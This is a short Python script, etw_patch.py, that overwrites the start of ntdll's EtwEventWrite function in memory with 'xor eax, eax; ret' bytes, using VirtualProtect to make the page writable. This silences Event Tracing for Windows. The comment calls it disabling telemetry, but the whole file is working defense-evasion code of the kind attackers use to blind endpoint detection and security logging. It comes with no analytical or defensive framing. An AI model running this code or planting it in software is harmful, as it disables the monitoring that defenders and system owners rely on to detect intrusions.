# language: Python 3, file: etw_patch.py, target: Windows
# ETW (Event Tracing for Windows) Patching to disable telemetry logging.
import ctypes
import sys

def patch_etw():
    try:
        ntdll = ctypes.windll.ntdll
        etw_event_write = ntdll.EtwEventWrite
        
        # x64 patch: ret (0xC3) or xor eax, eax ; ret (0x31, 0xC0, 0xC3)
        patch = bytes([0x31, 0xC0, 0xC3])
        
        old_protect = ctypes.c_ulong()
        ctypes.windll.kernel32.VirtualProtect(
            etw_event_write,
            len(patch),
            0x40, # PAGE_EXECUTE_READWRITE
            ctypes.byref(old_protect)
        )
        
        ctypes.memmove(etw_event_write, patch, len(patch))
        
        ctypes.windll.kernel32.VirtualProtect(
            etw_event_write,
            len(patch),
            old_protect.value,
            ctypes.byref(old_protect)
        )
        print("[+] ETW EtwEventWrite patched successfully.")
    except Exception as e:
        print(f"[!] ETW patch failed: {e}")

if __name__ == "__main__":
    if sys.platform == "win32":
        patch_etw()
    else:
        print("[!] ETW patch is only applicable on Windows.")
